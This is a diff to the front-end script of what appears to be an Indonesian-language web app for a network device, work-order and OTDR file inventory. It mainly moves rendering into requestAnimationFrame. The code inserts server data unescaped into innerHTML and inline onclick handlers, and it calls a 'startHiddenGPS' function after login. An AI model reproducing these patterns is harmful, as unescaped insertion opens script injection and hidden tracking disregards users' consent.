+                if(panel.classList.contains('hidden')) {
+                    panel.classList.remove('hidden'); chevron.classList.add('rotate-180');
+                    requestAnimationFrame(() => panel.classList.remove('opacity-0', 'translate-y-2'));
+                } else {
+                    panel.classList.add('opacity-0', 'translate-y-2'); chevron.classList.remove('rotate-180');
+                    setTimeout(() => requestAnimationFrame(() => panel.classList.add('hidden')), 300);
+                }
+            });
         }
         
         function toggleLocAccordion(idx) {
             const body = document.getElementById('locBody_' + idx);
             const chev = document.getElementById('locChev_' + idx);
-            if(body.classList.contains('hidden')) {
-                body.classList.remove('hidden'); chev.classList.add('rotate-180');
-            } else {
-                body.classList.add('hidden'); chev.classList.remove('rotate-180');
-            }
+            requestAnimationFrame(() => {
+                if(body.classList.contains('hidden')) {
+                    body.classList.remove('hidden'); chev.classList.add('rotate-180');
+                } else {
+                    body.classList.add('hidden'); chev.classList.remove('rotate-180');
+                }
+            });
         }
 
         function loadRecapFromServer() {
@@ -1085,7 +1137,7 @@
                 });
                 
                 html += `</div>`; 
-                panel.innerHTML = html;
+                requestAnimationFrame(() => panel.innerHTML = html);
             }).withFailureHandler(err => { panel.innerHTML = `<div class="text-center py-6 text-sm text-red-400">Gagal memuat rekap.</div>`; }).getRecapStats();
         }
 
@@ -1120,96 +1172,101 @@
             lastSearchResult = data;
             const container = document.getElementById('data-list-container');
             const emptyState = document.getElementById('emptyState');
-            container.innerHTML = '';
             
-            if (!data || data.length === 0) { emptyState.classList.remove('hidden'); return; }
-            emptyState.classList.add('hidden');
-
-            data.forEach((item, index) => {
-                let typeBorderColor = 'border-l-purple-500';
-                let typeColor = 'text-purple-400 bg-purple-500/10 border-purple-500/30';
-                let typeIcon = 'fa-server';
+            // Menggunakan requestAnimationFrame agar UI tidak nge-freeze saat render string panjang
+            requestAnimationFrame(() => {
+                container.innerHTML = '';
                 
-                if(item.tipe === 'Switch') {
-                    typeBorderColor = 'border-l-blue-500';
-                    typeColor = 'text-blue-400 bg-blue-500/10 border-blue-500/30';
-                    typeIcon = 'fa-random';
-                } else if(item.tipe === 'Backbone') {
-                    typeBorderColor = 'border-l-orange-500';
-                    typeColor = 'text-orange-400 bg-orange-500/10 border-orange-500/30';
-                    typeIcon = 'fa-route';
-                }
-                
-                let statusColor = 'text-accent-400 bg-accent-500/10 border-accent-500/30';
-                let statusDotColor = 'bg-accent-500 shadow-[0_0_5px_#10b981]';
-                
-                if(item.status === 'Offline') {
-                    statusColor = 'text-red-400 bg-red-500/10 border-red-500/30';
-                    statusDotColor = 'bg-red-500 shadow-[0_0_5px_#ef4444]';
-                } else if(item.status === 'Warning') {
-                    statusColor = 'text-amber-400 bg-amber-500/10 border-amber-500/30';
-                    statusDotColor = 'bg-amber-500 shadow-[0_0_5px_#f59e0b]';
-                }
+                if (!data || data.length === 0) { emptyState.classList.remove('hidden'); return; }
+                emptyState.classList.add('hidden');
 
-                const ownerActions = isOwner ? `
-                    <div class="flex gap-2 mt-2 pt-3 border-t border-zinc-700/50">
-                        <button onclick="openEditModal(${index})" class="flex-1 bg-dark-800 hover:bg-dark-700 text-amber-400 border border-zinc-700 text-[10px] font-bold py-2 rounded-lg transition active:scale-95"><i class="fa-solid fa-pen mr-1"></i> Edit</button>
-                        <button onclick="confirmDeleteNode(${index})" class="flex-1 bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 text-[10px] font-bold py-2 rounded-lg transition active:scale-95"><i class="fa-solid fa-trash mr-1"></i> Hapus</button>
-                    </div>` : '';
+                let htmlContent = '';
+                data.forEach((item, index) => {
+                    let typeBorderColor = 'border-l-purple-500';
+                    let typeColor = 'text-purple-400 bg-purple-500/10 border-purple-500/30';
+                    let typeIcon = 'fa-server';
+                    
+                    if(item.tipe === 'Switch') {
+                        typeBorderColor = 'border-l-blue-500';
+                        typeColor = 'text-blue-400 bg-blue-500/10 border-blue-500/30';
+                        typeIcon = 'fa-random';
+                    } else if(item.tipe === 'Backbone') {
+                        typeBorderColor = 'border-l-orange-500';
+                        typeColor = 'text-orange-400 bg-orange-500/10 border-orange-500/30';
+                        typeIcon = 'fa-route';
+                    }
+                    
+                    let statusColor = 'text-accent-400 bg-accent-500/10 border-accent-500/30';
+                    let statusDotColor = 'bg-accent-500 shadow-[0_0_5px_#10b981]';
+                    
+                    if(item.status === 'Offline') {
+                        statusColor = 'text-red-400 bg-red-500/10 border-red-500/30';
+                        statusDotColor = 'bg-red-500 shadow-[0_0_5px_#ef4444]';
+                    } else if(item.status === 'Warning') {
+                        statusColor = 'text-amber-400 bg-amber-500/10 border-amber-500/30';
+                        statusDotColor = 'bg-amber-500 shadow-[0_0_5px_#f59e0b]';
+                    }
 
-                const cardHtml = `
-                    <div class="glass-card p-4 rounded-2xl relative group border-l-4 ${typeBorderColor} flex flex-col gap-3">
-                        <div class="flex justify-between items-start gap-2">
-                            <h4 class="font-bold text-white text-sm md:text-base break-words leading-tight mt-1">${item.nama_perangkat}</h4>
-                            <span class="px-2 py-1 rounded-md text-[10px] font-bold border flex items-center gap-1.5 shrink-0 ${typeColor}">
-                                <i class="fa-solid ${typeIcon}"></i> ${item.tipe}
-                            </span>
-                        </div>
-                        
-                        <div class="flex justify-between items-center mt-1">
-                            <div class="border border-zinc-700/50 bg-dark-800/80 rounded-md px-2 py-1 flex items-center gap-2 text-xs text-brand-400 font-mono shadow-inner">
-                                <i class="fa-solid fa-network-wired text-brand-500/70"></i> ${item.ip_address || '-'}
+                    const ownerActions = isOwner ? `
+                        <div class="flex gap-2 mt-2 pt-3 border-t border-zinc-700/50">
+                            <button onclick="openEditModal(${index})" class="flex-1 bg-dark-800 hover:bg-dark-700 text-amber-400 border border-zinc-700 text-[10px] font-bold py-2 rounded-lg transition active:scale-95"><i class="fa-solid fa-pen mr-1"></i> Edit</button>
+                            <button onclick="confirmDeleteNode(${index})" class="flex-1 bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 text-[10px] font-bold py-2 rounded-lg transition active:scale-95"><i class="fa-solid fa-trash mr-1"></i> Hapus</button>
+                        </div>` : '';
+
+                    htmlContent += `
+                        <div class="glass-card p-4 rounded-2xl relative group border-l-4 ${typeBorderColor} flex flex-col gap-3 transform translateZ(0)">
+                            <div class="flex justify-between items-start gap-2">
+                                <h4 class="font-bold text-white text-sm md:text-base break-words leading-tight mt-1">${item.nama_perangkat}</h4>
+                                <span class="px-2 py-1 rounded-md text-[10px] font-bold border flex items-center gap-1.5 shrink-0 ${typeColor}">
+                                    <i class="fa-solid ${typeIcon}"></i> ${item.tipe}
+                                </span>
                             </div>
-                            <div class="px-3 py-1 rounded-full text-[10px] font-bold border flex items-center gap-1.5 ${statusColor}">
-                                <span class="w-1.5 h-1.5 rounded-full animate-pulse ${statusDotColor}"></span> ${item.status}
+                            
+                            <div class="flex justify-between items-center mt-1">
+                                <div class="border border-zinc-700/50 bg-dark-800/80 rounded-md px-2 py-1 flex items-center gap-2 text-xs text-brand-400 font-mono shadow-inner">
+                                    <i class="fa-solid fa-network-wired text-brand-500/70"></i> ${item.ip_address || '-'}
+                                </div>
+                                <div class="px-3 py-1 rounded-full text-[10px] font-bold border flex items-center gap-1.5 ${statusColor}">
+                                    <span class="w-1.5 h-1.5 rounded-full animate-pulse ${statusDotColor}"></span> ${item.status}
+                                </div>
                             </div>
-                        </div>
-                        
-                        <div class="h-[1px] w-full bg-zinc-800/80 my-0.5"></div>
-                        
-                        <div class="grid grid-cols-2 gap-2">
-                            <div>
-                                <p class="text-[10px] text-zinc-400 mb-1 flex items-center gap-1.5 font-medium"><i class="fa-solid fa-map-pin text-accent-500"></i> Lokasi</p>
-                                <p class="text-[11px] font-semibold text-white break-words">${item.lokasi || '-'}</p>
+                            
+                            <div class="h-[1px] w-full bg-zinc-800/80 my-0.5"></div>
+                            
+                            <div class="grid grid-cols-2 gap-2">
+                                <div>
+                                    <p class="text-[10px] text-zinc-400 mb-1 flex items-center gap-1.5 font-medium"><i class="fa-solid fa-map-pin text-accent-500"></i> Lokasi</p>
+                                    <p class="text-[11px] font-semibold text-white break-words">${item.lokasi || '-'}</p>
+                                </div>
+                                <div>
+                                    <p class="text-[10px] text-zinc-400 mb-1 flex items-center gap-1.5 font-medium"><i class="fa-solid fa-ethernet text-purple-400"></i> Port Info</p>
+                                    <p class="text-[11px] font-semibold text-white break-words">${item.info_port || '-'}</p>
+                                </div>
                             </div>
-                            <div>
-                                <p class="text-[10px] text-zinc-400 mb-1 flex items-center gap-1.5 font-medium"><i class="fa-solid fa-ethernet text-purple-400"></i> Port Info</p>
-                                <p class="text-[11px] font-semibold text-white break-words">${item.info_port || '-'}</p>
+                            
+                            <div class="bg-dark-900/80 border border-zinc-800/70 rounded-xl p-3 flex justify-between items-center mt-1">
+                                <div class="flex items-center gap-2 text-[10px] text-zinc-400 font-medium">
+                                    <i class="fa-solid fa-barcode text-orange-400"></i> Kode OTB
+                                </div>
+                                <div class="text-xs font-bold text-white break-words text-right font-mono">
+                                    ${item.kode_otb || '-'}
+                                </div>
                             </div>
-                        </div>
-                        
-                        <div class="bg-dark-900/80 border border-zinc-800/70 rounded-xl p-3 flex justify-between items-center mt-1">
-                            <div class="flex items-center gap-2 text-[10px] text-zinc-400 font-medium">
-                                <i class="fa-solid fa-barcode text-orange-400"></i> Kode OTB
-                            </div>
-                            <div class="text-xs font-bold text-white break-words text-right font-mono">
-                                ${item.kode_otb || '-'}
-                            </div>
-                        </div>
-                        
-                        ${ownerActions}
-                    </div>`;
-                container.insertAdjacentHTML('beforeend', cardHtml);
+                            
+                            ${ownerActions}
+                        </div>`;
+                });
+                
+                container.innerHTML = htmlContent;
             });
         }
 
         // ==============================================================
-        // [PENAMBAHAN] FUNGSI EXPORT DATA EXCEL KESELURUHAN (TANPA LIMIT 50)
+        // FUNGSI EXPORT DATA EXCEL KESELURUHAN (TANPA LIMIT 50)
         // ==============================================================
         function exportTableToExcelTemplate(format = 'xlsx') {
             showToast('Menyiapkan data export dari server, mohon tunggu...', 'info');
             
-            // Ambil parameter filter saat ini agar data yang di-export sesuai dengan tab yang sedang aktif
             const filters = { 
                 type: currentFilter, 
                 nama: document.getElementById('searchNama').value, 
@@ -1218,7 +1275,6 @@
                 otb: document.getElementById('searchOtb').value 
             };
             
-            // Tembak API baru yang mengambil SEMUA data tanpa limit
             google.script.run.withSuccessHandler(fullData => {
                 if (!fullData || fullData.length === 0) {
                     return showToast('Tidak ada data untuk diexport!', 'error');
@@ -1340,23 +1396,28 @@
 
         function renderEWOList(data) {
             lastEwoResult = data || []; 
-            const container = document.getElementById('ewoList'); container.innerHTML = '';
-            if(!data || data.length === 0) { container.innerHTML = '<div class="text-center text-zinc-500 py-4 text-xs italic">No EWO records found.</div>'; return; }
+            const container = document.getElementById('ewoList'); 
+            
+            requestAnimationFrame(() => {
+                container.innerHTML = '';
+                if(!data || data.length === 0) { container.innerHTML = '<div class="text-center text-zinc-500 py-4 text-xs italic">No EWO records found.</div>'; return; }
 
-            data.forEach(item => {
-                const statClass = item.status === 'Done' ? 'text-accent-400 bg-accent-500/10 border-accent-500/30' : 'text-amber-400 bg-amber-500/10 border-amber-500/30';
-                const ownerActions = isOwner ? `
-                    <div class="mt-2 pt-2 border-t border-zinc-700/50 flex gap-2">
-                        <button onclick="openEditEWO('${item.no_ewo}', '${item.deskripsi}')" class="text-[10px] text-amber-400 hover:text-amber-300 px-2 py-1 bg-dark-800 rounded-md border border-zinc-700"><i class="fa-solid fa-pen"></i> Edit</button>
-                        <button onclick="confirmDeleteEWO('${item.no_ewo}', '${item.deskripsi}')" class="text-[10px] text-red-400 hover:text-red-300 px-2 py-1 bg-dark-800 rounded-md border border-zinc-700"><i class="fa-solid fa-trash"></i> Hapus</button>
-                    </div>` : '';
-                const html = `
-                    <div class="bg-dark-800/60 p-3.5 rounded-2xl border border-zinc-800 border-l-4 ${item.status === 'Done' ? 'border-l-accent-500' : 'border-l-amber-500'}">
-                        <div class="flex justify-between items-start mb-1"><span class="font-bold text-white text-xs">${item.no_ewo}</span><span class="text-[9px] px-2 py-0.5 rounded-full border font-semibold ${statClass}">${item.status}</span></div>
-                        <p class="text-zinc-400 text-xs mb-1.5 line-clamp-2">${item.deskripsi}</p>
-                        ${ownerActions}
-                    </div>`;
-                container.insertAdjacentHTML('beforeend', html);
+                let htmlContent = '';
+                data.forEach(item => {
+                    const statClass = item.status === 'Done' ? 'text-accent-400 bg-accent-500/10 border-accent-500/30' : 'text-amber-400 bg-amber-500/10 border-amber-500/30';
+                    const ownerActions = isOwner ? `
+                        <div class="mt-2 pt-2 border-t border-zinc-700/50 flex gap-2">
+                            <button onclick="openEditEWO('${item.no_ewo}', '${item.deskripsi}')" class="text-[10px] text-amber-400 hover:text-amber-300 px-2 py-1 bg-dark-800 rounded-md border border-zinc-700"><i class="fa-solid fa-pen"></i> Edit</button>
+                            <button onclick="confirmDeleteEWO('${item.no_ewo}', '${item.deskripsi}')" class="text-[10px] text-red-400 hover:text-red-300 px-2 py-1 bg-dark-800 rounded-md border border-zinc-700"><i class="fa-solid fa-trash"></i> Hapus</button>
+                        </div>` : '';
+                    htmlContent += `
+                        <div class="bg-dark-800/60 p-3.5 rounded-2xl border border-zinc-800 border-l-4 transform translateZ(0) ${item.status === 'Done' ? 'border-l-accent-500' : 'border-l-amber-500'}">
+                            <div class="flex justify-between items-start mb-1"><span class="font-bold text-white text-xs">${item.no_ewo}</span><span class="text-[9px] px-2 py-0.5 rounded-full border font-semibold ${statClass}">${item.status}</span></div>
+                            <p class="text-zinc-400 text-xs mb-1.5 line-clamp-2">${item.deskripsi}</p>
+                            ${ownerActions}
+                        </div>`;
+                });
+                container.innerHTML = htmlContent;
             });
         }
 
@@ -1435,15 +1496,18 @@
                 currentOtdrPage = res.currentPage; totalOtdrPages = res.totalPages;
                 document.getElementById('otdrPageInfo').innerText = `Page ${currentOtdrPage} / ${totalOtdrPages}`;
                 document.getElementById('otdrPrevBtn').disabled = currentOtdrPage <= 1; document.getElementById('otdrNextBtn').disabled = currentOtdrPage >= totalOtdrPages;
-                document.getElementById('selectAllOtdr').checked = false; renderOTDRList(res.data);
+                document.getElementById('selectAllOtdr').checked = false; 
+                requestAnimationFrame(() => renderOTDRList(res.data));
             }).withFailureHandler(err => lst.innerHTML='Gagal memuat OTDR').getOTDRData(page);
         }
         function changeOTDRPage(dir) { refreshOTDRList(currentOtdrPage + dir); }
 
         function toggleFolderContent(headerEl) {
             const content = headerEl.nextElementSibling; const chevron = headerEl.querySelector('.chevron-icon'); const folderIcon = headerEl.querySelector('.folder-icon');
-            if (content.classList.contains('hidden')) { content.classList.remove('hidden'); chevron.classList.add('rotate-180'); folderIcon.classList.replace('fa-folder', 'fa-folder-open'); } 
-            else { content.classList.add('hidden'); chevron.classList.remove('rotate-180'); folderIcon.classList.replace('fa-folder-open', 'fa-folder'); }
+            requestAnimationFrame(() => {
+                if (content.classList.contains('hidden')) { content.classList.remove('hidden'); chevron.classList.add('rotate-180'); folderIcon.classList.replace('fa-folder', 'fa-folder-open'); } 
+                else { content.classList.add('hidden'); chevron.classList.remove('rotate-180'); folderIcon.classList.replace('fa-folder-open', 'fa-folder'); }
+            });
         }
 
         function renderOTDRList(data) {
@@ -1467,7 +1531,7 @@
                     `;
                 }
 
-                html += `<div class="mb-3 border border-zinc-800/80 rounded-2xl overflow-hidden bg-dark-800/30">
+                html += `<div class="mb-3 border border-zinc-800/80 rounded-2xl overflow-hidden bg-dark-800/30 transform translateZ(0)">
                     <div onclick="toggleFolderContent(this)" class="bg-dark-800/60 px-4 py-3 font-bold text-zinc-300 text-[11px] flex items-center justify-between cursor-pointer select-none hover:bg-dark-700/60 transition-colors border-b border-zinc-800/50">
                         <span class="flex items-center truncate pr-2 flex-1">
                             <i class="fa-solid fa-folder text-purple-400 mr-2 text-sm folder-icon"></i> <span class="truncate">${folderName}</span> 
@@ -1493,7 +1557,7 @@
                             <button type="button" onclick="confirmDeleteOTDR('${safeOtb}', '${safeTimestamp}')" class="text-red-500 hover:text-red-400 active:scale-90 p-1.5 bg-dark-800 rounded border border-zinc-700"><i class="fa-solid fa-trash text-[10px]"></i></button>
                         </div>`;
                     }
-                    html += `<div class="glass-card p-3 rounded-xl flex items-center justify-between group border-zinc-800/50">
+                    html += `<div class="glass-card p-3 rounded-xl flex items-center justify-between group border-zinc-800/50 transform translateZ(0)">
                         <div class="flex items-center gap-3 flex-1 min-w-0">
                             <input type="checkbox" class="otdr-checkbox w-4 h-4 rounded border-zinc-600 bg-dark-900 accent-purple-500 cursor-pointer shrink-0" data-url="${item.file_url}">
                             <div class="flex flex-col min-w-0">
@@ -1533,7 +1597,7 @@
                 Array.from(input.files).forEach(file => {
                     const size = file.size > 1024 * 1024 ? (file.size / (1024 * 1024)).toFixed(2) + ' MB' : (file.size / 1024).toFixed(1) + ' KB';
                     html += `
-                        <div class="flex items-center justify-between bg-dark-900/80 p-2.5 rounded-lg border border-zinc-700/50">
+                        <div class="flex items-center justify-between bg-dark-900/80 p-2.5 rounded-lg border border-zinc-700/50 transform translateZ(0)">
                             <div class="flex items-center gap-2 overflow-hidden w-full">
                                 <i class="fa-solid fa-file-waveform text-purple-500 text-xs shrink-0"></i>
                                 <span class="text-[11px] text-zinc-300 truncate font-medium flex-1">${file.name}</span>
@@ -1556,7 +1620,6 @@
             const fileInput = document.getElementById('fileOtdr');
             if (fileInput.files.length === 0) return showToast('Pilih minimal satu file .sor!', 'error');
             
-            // Validasi File Ekstensi (Karena accept="*/*" mengizinkan semua file di picker di webview Android)
             for (let i = 0; i < fileInput.files.length; i++) {
                 if (!fileInput.files[i].name.toLowerCase().endsWith('.sor')) {
                     return showToast('Gagal: Pastikan Anda hanya memilih file berekstensi .sor', 'error');
@@ -1723,7 +1786,6 @@
                 }
                 
                 startHiddenGPS(sData.email);
-
                 refreshDashboardStats();
             } else {
                 document.getElementById('loginPage').classList.remove('hidden'); document.getElementById('dashboardPage').classList.add('hidden');
